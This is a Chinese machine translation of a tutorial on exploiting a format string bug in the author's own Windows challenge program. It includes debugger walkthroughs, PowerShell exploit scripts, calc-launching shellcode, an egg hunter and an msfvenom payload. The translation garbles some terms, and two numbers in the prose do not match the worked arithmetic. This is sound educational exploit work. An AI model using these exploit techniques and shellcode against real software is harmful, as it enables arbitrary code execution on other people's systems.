<html>
<head>
<title>Exploiting Format Strings in Windows</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用Windows中的格式字符串</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-format-strings-in-windows-5f96c9b29dea?source=collection_archive---------0-----------------------#2020-02-03">https://infosecwriteups.com/exploiting-format-strings-in-windows-5f96c9b29dea?source=collection_archive---------0-----------------------#2020-02-03</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><p id="52cc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi ko translated"><span class="l kp kq kr bm ks kt ku kv kw di">我</span>想做一个小的<a class="ae kx" href="https://github.com/OsandaMalith/Exploits/blob/master/Challenges/Challenge%20-%201.7z?raw=true" rel="noopener ugc nofollow" target="_blank">挑战</a>利用Windows中的格式字符串。这就是它的样子，它要求打开一个文件名。起初，这可能有点令人困惑。读取文件时没有易受攻击的函数。你可以看到我们对程序的第一个论点在程序中得到了回应。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi ky"><img src="../Images/96ed37404d978089094c04852acfd556.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/0*FopPsPofSffkqODQ"/></div></figure><p id="d100" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们在调试器中研究一下这个问题。如你所见，如果<em class="lg"> argc == 2 </em>应用程序继续流程，并且<em class="lg"> argv[1] </em>被传递到高亮显示的函数中。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/9e638d6b22a6bc82fef5e9452b1a652e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*LcgR3In8I_PiNDX3"/></div></figure><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/0b8fc4ab94cbfb2c06a1fe322a29628f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*5xwGHEpXyGALQISS"/></div></figure><p id="4ac5" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在该函数中，<em class="lg"> memset </em>用于用0填充内存，而<em class="lg"> strncpy </em>用于将用户输入复制到已填充的缓冲空间中。但是如果你注意到<em class="lg"> eax </em>被<em class="lg"> printf </em>函数直接调用，而没有指定任何格式字符串参数。函数<em class="lg"> printf </em>会直接调用我们的缓冲区。这很有趣</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi li"><img src="../Images/e18355f03edc7790203592ce39defbaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:730/0*cD4dm1tVsITUrt5t"/></div></figure><p id="e736" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们尝试使用%X格式字符串读取堆栈，该字符串用于以十六进制格式显示文本。如你所见<em class="lg"> printf </em>函数从高内存到低内存读取堆栈。</p><p id="4563" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我会给出80个A字符和一堆%x格式的字符串，看输出。</p><p id="f7ef" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">你可以看到41表示十六进制A，2558表示%X。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/c4102672a9c3f9e59ae3fc431266486c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*24SpOcu5iJ86apM6"/></div></figure><p id="8338" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们可以使用%n来显示到目前为止在一个字符串中写入的字符数，直到偏移量%n被放置。我们必须传递变量的地址。基本上，这将写入一个内存位置。举个例子，</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="a764" class="lo lp it lk b gy lq lr l ls lt">int main() {<br/>int number;<br/>printf("Hello %nWorld", &amp;number);<br/>printf("%d", number);<br/>}</span></pre><p id="c04e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这将打印出值6。</p><p id="5ef2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">所以，让我们试着在输入中放一个%n，看看会发生什么。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/b1b22955ccfae7ac99f4f1ca614746a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*K42-g8DevYPcpUdV"/></div></figure><p id="2e52" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">程序在试图写入地址时崩溃。让我们看看调试器内部发生了什么。这就是事情变得一团糟的地方。ECX的值被移入指向EAX的地址。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lu"><img src="../Images/dfb44256c86b4b4b8327394136802a0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1160/0*CL65qunI3i5Bw-bU"/></div></figure><p id="efb8" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们检查一下收银机。EAX包含78257825，即“x%x%”，ECX包含f8。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lv"><img src="../Images/c64d372a99e00ca5091f8a86a7e82a55.png" data-original-src="https://miro.medium.com/v2/resize:fit:586/0*Mn7WtK3v0B1Gp7lp"/></div></figure><p id="38a3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们检查一下堆栈。如果我们往下看堆栈，我们可以在堆栈上看到我们注入的字符。这可能会给你一个放置外壳代码而不是“A”字符的好主意</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lw"><img src="../Images/81fe64df8f950f24934907a29b02cfb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:684/0*7Ibm8_GOnsTjfAVE"/></div></figure><p id="e9d2" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">在函数结尾，一旦命中RET，EIP将指向堆栈上前一个函数的返回地址。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lx"><img src="../Images/9c34433d21df27e81f42bc5cdca358be.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/0*AYZ17vF6SimREUJj"/></div></figure><p id="531e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">如果我们检查调用堆栈，我们可以看到指向0019f72c的第一个帧指针</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/1c2bbd452890b0647ca2332f4a038862.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/0*Dz9CmKCer-Gfm3b4"/></div></figure><p id="4168" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">返回地址将是0019f730，它指向前一个函数的00401188。如果您注意到0019f730地址前面有一个空字节。但是，如果我们在有效载荷的末尾以小端格式写下这个地址，这就不是问题了</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lz"><img src="../Images/4edf251bee292e396a7ea5c06766655b.png" data-original-src="https://miro.medium.com/v2/resize:fit:442/0*LHq1fJViZd9vMFkp"/></div></figure><p id="1e74" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">计划是这样的。在这种情况下，我们可以控制ECX和EAX。我们可以在ECX内部写外壳代码的地址，在EAX寄存器内部写返回地址的指针。一旦程序命中"<em class="lg"> mov dword ptr [eax]，ecx</em>" shellcode的地址将被写入堆栈上的返回地址。当程序到达函数的结尾并点击结束键时，RET EIP将指向我们新写的地址，这个地址指向我们的外壳代码</p><p id="6c69" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">好吧，这个计划听起来很酷，让我们试着实现它，并进行试验。<br/>首先，我们应该把EAX指向我们的回信地址。我的第一个有效载荷是这样的。与上一张图一样，EAX包含78257825，即“x%x%”。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="30bd" class="lo lp it lk b gy lq lr l ls lt">$Buffer = 'A' * 80<br/>$fmt = '%x' * 21 + '%n'<br/>$ret = 'B' * 4<br/>$final = $Buffer + $fmt + $ret<br/>Start-Process ./fmt.exe -ArgumentList $final</span></pre><p id="5739" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">我们必须继续试验，直到EAX指出我们的4 B字符。我不断增加“%x”字符，终于让EAX指向“BBBB”。所以，我尝试的下一个有效载荷是这个。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="fa20" class="lo lp it lk b gy lq lr l ls lt">$Buffer = 'A' * 80<br/>$fmt = '%x' * 41 + '%n'<br/>$ret = 'B' * 4<br/>$final = $Buffer + $fmt + $ret<br/>Start-Process ./fmt.exe -ArgumentList $final</span></pre><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/716a4e6f2f8c544ff70bb9fdb82daf02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/0*OPV6GrNnvnvupQ-b"/></div></figure><p id="acdc" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们试着控制ECX注册表，让它指向我们的外壳代码地址。与上一张图片一样，我们的外壳代码位于0019f758。让我们把这个数除以4。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="279e" class="lo lp it lk b gy lq lr l ls lt">0x0019f758/4 = 425430</span></pre><p id="8495" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们把这个值赋予格式字符串%x，这将改变ECX的值。同时，我将把%x字符从41个增加到51个，让EAX指向我们的Bs。这个%x一次读取2个字符。我们必须不断试验，直到达到目标</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="3419" class="lo lp it lk b gy lq lr l ls lt">$Buffer = 'A' * 80<br/>$fmt = '%x' * 51 + '%.425430x' * 4 +'%n'<br/>$ret = 'B' * 4<br/>$final = $Buffer + $fmt + $ret<br/>Start-Process ./fmt.exe -ArgumentList $final</span></pre><p id="9bb8" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在ECX指向0019f940，但我们需要ECX指向0019f758。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi ma"><img src="../Images/45da2498606f22a58219bcb98ddc0009.png" data-original-src="https://miro.medium.com/v2/resize:fit:1128/0*F3wtFGGs1f_63S_3"/></div></figure><p id="759d" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们找出不同之处，再试一次。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="54e8" class="lo lp it lk b gy lq lr l ls lt">0x0019f940– 0x0019f758 = 488</span></pre><p id="3794" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">通过在最后一个格式字符串中添加408，我们应该接近我们的目标了。让我们试一试。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="25a4" class="lo lp it lk b gy lq lr l ls lt">425430 + 488 = 425918</span><span id="642d" class="lo lp it lk b gy mb lr l ls lt">$Buffer = ‘A’ * 80<br/>$fmt = ‘%x’ * 51 + ‘%.425430x’ * 3 + ‘%.425918x’ +’%n’<br/>$ret = ‘B’ * 4<br/>$final = $Buffer + $fmt + $ret<br/>Start-Process ./fmt.exe -ArgumentList $final</span></pre><p id="249c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在ECX指向19fb28。让我们再次找到不同之处。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi mc"><img src="../Images/435d45dc568e2af1a4572d8ca16192e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1158/0*5UXZyjkjY-zT3yDf"/></div></figure><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="d5f4" class="lo lp it lk b gy lq lr l ls lt">0x19fb28 – 0x19f758 = 976</span></pre><p id="8edf" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">通过减去最后一个格式字符串的差值，我们应该让ECX指向我们需要的确切地址。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="4ee7" class="lo lp it lk b gy lq lr l ls lt">425918 -  949 = 424942</span><span id="7760" class="lo lp it lk b gy mb lr l ls lt">$Buffer = 'A' * 80<br/>$fmt = '%x' * 51 + '%.425430x' * 3 + '%.424942x' +'%n'<br/>$ret = 'B' * 4<br/>$final = $Buffer + $fmt + $ret<br/>Start-Process ./fmt.exe -ArgumentList $final</span></pre><p id="2965" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">现在，ECX指向19f758，这是我们将要放置外壳代码的位置。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi md"><img src="../Images/db80979d2afc40372989c4fb56005b39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/0*scVhZR0ynNKwjhmc"/></div></figure><p id="9ba3" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">由于我们有80个字符，我将首先尝试编写自己的will代码来弹出一个calc。因为如果我再增加A字符的数量，计算偏移量会很麻烦。我将使用WinExec API来调用calc。让我们找到它的地址。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi me"><img src="../Images/9d9804f46dca192cac99ebc563c04860.png" data-original-src="https://miro.medium.com/v2/resize:fit:816/0*TBqQZRbgo9cFyg2y"/></div></figure><p id="d283" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是一个简单的asm代码，我编写它来调用WinExec API。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="f967" class="lo lp it lk b gy lq lr l ls lt">format PE GUI 4.0<br/>entry ShellCode<br/>include 'win32ax.inc'<br/>; Author: <a class="ae kx" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a><br/>section '.code' executable readable writeable<br/>ShellCode:<br/>push ebp<br/>mov ebp, esp<br/>xor edi, edi<br/>push edi<br/>mov byte  [ebp-04h], 'c'<br/>mov byte  [ebp-03h], 'a'<br/>mov byte  [ebp-02h], 'l'<br/>mov byte  [ebp-01h], 'c'<br/>mov dword [esp+4], edi<br/>mov byte  [ebp-08h], 01h<br/>lea eax, [ebp-04h]<br/>push eax<br/>mov eax, 75263640h<br/>call eax</span></pre><p id="620e" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这是我们最后的利用。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="3ee7" class="lo lp it lk b gy lq lr l ls lt">&lt;#<br/># Author: <a class="ae kx" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a><br/># Website: <a class="ae kx" href="https://osandamalith.com" rel="noopener ugc nofollow" target="_blank">https://osandamalith.com</a><br/># Format String Exploitation<br/>#&gt;<br/>$shellcode = [Byte[]] @(<br/>0x55,                         # push ebp<br/>0x89, 0xE5,                   # mov ebp, esp<br/>0x31, 0xFF,                   # xor edi, edi<br/>0x57,                         # push edi<br/>0xC6, 0x45, 0xFC, 0x63,       # mov byte  [ebp-04h], 'c'<br/>0xC6, 0x45, 0xFD, 0x61,       # mov byte  [ebp-03h], 'a'<br/>0xC6, 0x45, 0xFE, 0x6C,       # mov byte  [ebp-02h], 'l'<br/>0xC6, 0x45, 0xFF, 0x63,       # mov byte  [ebp-01h], 'c'<br/>0x89, 0x7C, 0x24, 0x04,       # mov dword [esp+4], edi<br/>0xC6, 0x45, 0xF8, 0x01,       # mov byte  [ebp-08h], 01h<br/>0x8D, 0x45, 0xFC,             # lea eax,  [ebp-04h]<br/>0x50,                         # push eax<br/>0xB8, 0x40, 0x36, 0x26, 0x75, # mov eax, 75263640h<br/>0xFF, 0xD0                    # call eax<br/>)<br/>$shellcode += [Byte[]] (0x41) * (80 - $shellcode.Length)<br/>$fmt = ([system.Text.Encoding]::ASCII).GetBytes('%x' * 51)       +<br/>([system.Text.Encoding]::ASCII).GetBytes('%.425430x' * 3) +<br/>([system.Text.Encoding]::ASCII).GetBytes('%.424942x')     +<br/>([system.Text.Encoding]::ASCII).GetBytes('%n')<br/>$ret = [System.BitConverter]::GetBytes(0x0019f730)<br/>$final = $shellcode + $fmt + $ret<br/>$payload = ''<br/>ForEach ($i in $final) {<br/>$payload += ([system.Text.Encoding]::Default).GetChars($i)<br/>}<br/>Start-Process ./fmt.exe -ArgumentList $payload</span></pre><p id="fba8" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">让我们最后看一下调试器内部。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi mf"><img src="../Images/35081f615d0968f1ef549398301ed696.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/0*l7HQHj61BiNyOPMP"/></div></figure><p id="f05c" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">ECX 0019f758的值将被移到指向EAX 0019 f730的指针中，该指针是一个包含我们的返回地址的堆栈指针。如果我们看到ECX寄存器内部，它指向我们的外壳代码。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi mg"><img src="../Images/6751dbd96db501ed7dc8f75ebd7c0805.png" data-original-src="https://miro.medium.com/v2/resize:fit:1154/0*MJUPbHt76zwB3Tlx"/></div></figure><p id="2e44" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">函数一返回，EIP就会指向我们的外壳代码</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi mh"><img src="../Images/ace727f87233e3406ca8d8e9744b4db0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1092/0*DvMvZhYuEgemvrAB"/></div></figure><p id="00ab" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">一旦我们运行这个漏洞w00t！我们会得到我们的计算器</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi lh"><img src="../Images/bfd3b8161928453846706994f5fe3a17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/0*hsFBuxun8UremcMC"/></div></figure><p id="d73f" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">不如我们用一个鸡蛋猎人来找到我们的外壳代码？</p><p id="26dd" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">有人可能会说我们可以使用一个长跳转，或者我们可以直接将外壳代码放在开头。但是，我还是想到用这个来娱乐和好奇。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/b10d71b503232bab96f1f2fb3aa9d47e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/0*wq2Mp7ruRA5vI0sa"/></div></figure><p id="ef99" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">首先，我检查了坏字符，发现"<em class="lg"> \x00\x09\x20 </em>"是这个程序中的坏字符。这是鸡蛋猎人的漏洞。请注意，在不同的Windows平台中，偏移量可能会有所不同。</p><pre class="kz la lb lc gt lj lk ll lm aw ln bi"><span id="14b3" class="lo lp it lk b gy lq lr l ls lt">&lt;#<br/># Author: <a class="ae kx" href="http://twitter.com/OsandaMalith" rel="noopener ugc nofollow" target="_blank">@OsandaMalith</a><br/># Website: <a class="ae kx" href="https://osandamalith.com" rel="noopener ugc nofollow" target="_blank">https://osandamalith.com</a><br/># Egg hunter for the format string bug<br/>#&gt;<br/>[Byte[]] $egg = 0x66,0x81,0xca,0xff,0x0f,0x42,0x52,0x6a,0x02,0x58,0xcd,0x2e,0x3c,0x05,0x5a,0x74,0xef,0xb8,0x54,0x30,0x30,0x57,0x8b,0xfa,0xaf,0x75,0xea,0xaf,0x75,0xe7,0xff,0xe7<br/>$shellcode = ([system.Text.Encoding]::ASCII).GetBytes('W00TW00T')<br/>#msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f powershell -e x86/alpha_mixed<br/>[Byte[]] $shellcode += 0x89,0xe0,0xdd,0xc7,0xd9,0x70,0xf4,0x5a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x4a,0x43,0x43,0x43,0x43,0x43,0x43,0x37,0x52,0x59,0x6a,0x41,0x58,0x50,0x30,0x41,0x30,0x41,0x6b,0x41,0x41,0x51,0x32,0x41,0x42,0x32,0x42,0x42,0x30,0x42,0x42,0x41,0x42,0x58,0x50,0x38,0x41,0x42,0x75,0x4a,0x49,0x49,0x6c,0x78,0x68,0x4c,0x42,0x55,0x50,0x73,0x30,0x33,0x30,0x61,0x70,0x6c,0x49,0x6b,0x55,0x56,0x51,0x4b,0x70,0x73,0x54,0x6c,0x4b,0x56,0x30,0x56,0x50,0x6c,0x4b,0x32,0x72,0x76,0x6c,0x4e,0x6b,0x71,0x42,0x57,0x64,0x4e,0x6b,0x73,0x42,0x34,0x68,0x44,0x4f,0x48,0x37,0x53,0x7a,0x74,0x66,0x34,0x71,0x39,0x6f,0x4c,0x6c,0x45,0x6c,0x43,0x51,0x73,0x4c,0x76,0x62,0x44,0x6c,0x65,0x70,0x6b,0x71,0x38,0x4f,0x64,0x4d,0x37,0x71,0x7a,0x67,0x59,0x72,0x68,0x72,0x43,0x62,0x42,0x77,0x4e,0x6b,0x50,0x52,0x32,0x30,0x4e,0x6b,0x72,0x6a,0x77,0x4c,0x6e,0x6b,0x52,0x6c,0x57,0x61,0x73,0x48,0x78,0x63,0x72,0x68,0x33,0x31,0x38,0x51,0x30,0x51,0x6e,0x6b,0x70,0x59,0x75,0x70,0x55,0x51,0x4e,0x33,0x6c,0x4b,0x73,0x79,0x46,0x78,0x7a,0x43,0x45,0x6a,0x62,0x69,0x4c,0x4b,0x65,0x64,0x6c,0x4b,0x75,0x51,0x38,0x56,0x50,0x31,0x59,0x6f,0x4c,0x6c,0x59,0x51,0x6a,0x6f,0x76,0x6d,0x63,0x31,0x48,0x47,0x44,0x78,0x4d,0x30,0x42,0x55,0x4c,0x36,0x65,0x53,0x31,0x6d,0x58,0x78,0x55,0x6b,0x31,0x6d,0x71,0x34,0x31,0x65,0x6a,0x44,0x61,0x48,0x6e,0x6b,0x32,0x78,0x51,0x34,0x55,0x51,0x6a,0x73,0x71,0x76,0x6c,0x4b,0x44,0x4c,0x70,0x4b,0x4e,0x6b,0x53,0x68,0x57,0x6c,0x73,0x31,0x49,0x43,0x4e,0x6b,0x74,0x44,0x6e,0x6b,0x76,0x61,0x78,0x50,0x4c,0x49,0x30,0x44,0x76,0x44,0x66,0x44,0x73,0x6b,0x43,0x6b,0x61,0x71,0x53,0x69,0x32,0x7a,0x72,0x71,0x79,0x6f,0x6d,0x30,0x43,0x6f,0x63,0x6f,0x72,0x7a,0x6e,0x6b,0x74,0x52,0x7a,0x4b,0x4e,0x6d,0x31,0x4d,0x43,0x5a,0x55,0x51,0x6e,0x6d,0x4f,0x75,0x38,0x32,0x75,0x50,0x55,0x50,0x65,0x50,0x30,0x50,0x71,0x78,0x65,0x61,0x6c,0x4b,0x52,0x4f,0x6d,0x57,0x79,0x6f,0x4a,0x75,0x4f,0x4b,0x4a,0x50,0x4d,0x65,0x49,0x32,0x73,0x66,0x71,0x78,0x6f,0x56,0x6d,0x45,0x6f,0x4d,0x6f,0x6d,0x39,0x6f,0x4b,0x65,0x75,0x6c,0x45,0x56,0x51,0x6c,0x64,0x4a,0x4d,0x50,0x4b,0x4b,0x79,0x70,0x31,0x65,0x37,0x75,0x4d,0x6b,0x71,0x57,0x76,0x73,0x62,0x52,0x52,0x4f,0x71,0x7a,0x63,0x30,0x62,0x73,0x49,0x6f,0x69,0x45,0x53,0x53,0x51,0x71,0x50,0x6c,0x33,0x53,0x36,0x4e,0x53,0x55,0x70,0x78,0x32,0x45,0x45,0x50,0x41,0x41<br/>$egg += [Byte[]] (0x41) * (80 - $egg.Length)<br/>$fmt = ([system.Text.Encoding]::ASCII).GetBytes('%x' * 305)      +<br/>([system.Text.Encoding]::ASCII).GetBytes('%.425430x' * 3) +<br/>([system.Text.Encoding]::ASCII).GetBytes('%.424942x')     +<br/>([system.Text.Encoding]::ASCII).GetBytes('%n')<br/>$ret = [System.BitConverter]::GetBytes(0x0019f730)<br/>$final = $egg + $fmt + $shellcode + $ret<br/>$payload = ''<br/>ForEach ($i in $final) {<br/>$payload += ([system.Text.Encoding]::Default).GetChars($i)<br/>}<br/>Start-Process ./fmt.exe -ArgumentList $payload</span></pre><p id="73a6" class="pw-post-body-paragraph jq jr it js b jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn im bi translated">这种利用方法依赖于编译器。我在Embarcadero C++ (Borland C++)和Visual C++ 2000编译器上试验过这个。在其他编译器中，<em class="lg"> printf </em>函数与这些不一样。您可以对其他编译器进行更多的研究</p></div></div>    
</body>
</html>